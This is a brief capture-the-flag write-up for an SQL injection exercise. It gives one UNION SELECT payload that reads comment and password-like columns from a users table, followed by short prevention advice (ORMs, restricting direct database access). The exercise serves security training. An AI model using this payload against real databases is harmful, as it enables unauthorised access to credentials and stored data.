# 02_members_sql_injection

## Instructions

On the same page we type following sql query

```
1 AND 1=2 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users;
```

Last user has instruction for getting valid flag

## How to prevent

Use ORMs.
Avoid providing users with direct access to the database to prevent unintended interactions.
